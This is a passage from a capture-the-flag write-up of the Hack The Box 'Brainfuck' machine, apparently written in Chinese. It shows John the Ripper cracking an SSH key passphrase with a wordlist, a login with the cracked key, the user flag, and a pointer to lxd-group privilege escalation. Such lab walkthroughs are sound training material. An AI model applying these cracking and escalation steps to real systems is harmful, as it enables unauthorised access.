4d5774c86f94c0a88a9046066aa4f0af7cf46998b511427be5cbcf575fdec918945218985b002a943199dfc05a7167c68fb15c2ca17472bae6f8ddaec6b45f438b209b846b85db361c98a8d1e4438e4fb1ec82a40870038c216e79ab6149a6a1f5f8f53c7887c5ce4854634aa819210116466e08fcae8d8393caf4197b0c9df9ac7bdc7388ed91e8cbc0b10e48d26c85f200bc806bb229dda81db4e3e79a2ea10fe8f1bdba71160f2281db59961f4fb1f22090d64af11aa73f29803c2caf466f1ceef6451f84b04200f91574f0190
+                                                                                                                                        
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ sudo john id_rsa2 --wordlist=/usr/share/wordlists/rockyou.txt
+[sudo] password for kali: 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+3poulakia!       (id_rsa)     
+1g 0:00:00:05 DONE (2023-08-14 01:56) 0.1689g/s 2104Kp/s 2104Kc/s 2104KC/s 3prash0..3pornuthin
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                      
+</code></pre></div></div>
+<p>然后连接ssh，成功获取到user flag</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/htb/Brainfuck]
+└─$ sudo ssh -i id_rsa orestis@10.10.10.17
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+You have mail.
+Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
+orestis@brainfuck:~$ ls
+debug.txt  encrypt.sage  mail  output.txt  user.txt
+orestis@brainfuck:~$ cat user.txt
+2c11cfbc5b959f73ac15a3310bd097c9
+
+</code></pre></div></div>
+
+<h2 id="lxd提权">Lxd提权</h2>
+
+<p>用户在lxd组中，所以可以用lxd提权</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>orestis@brainfuck:~$ id
+uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd-Privilege-Escalation</a></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      <a href="/tags/#privilege-escalation" class="page__taxonomy-item" rel="tag">privilege-escalation</a><span class="sep">, </span>
+    
+      <a href="/tags/#smtp" class="page__taxonomy-item" rel="tag">smtp</a><span class="sep">, </span>
+    
+      <a href="/tags/#ssh" class="page__taxonomy-item" rel="tag">ssh</a><span class="sep">, </span>
+    
+      <a href="/tags/#vigenere" class="page__taxonomy-item" rel="tag">vigenere</a><span class="sep">, </span>
+    
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a><span class="sep">, </span>
+    
+      <a href="/tags/#wordpress" class="page__taxonomy-item" rel="tag">wordpress</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">hack-the-box</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-08-14T00:00:00+08:00">August 14, 2023</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/hack-the-box/lame/" class="pagination--pager" title="HackTheBox - Lame
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
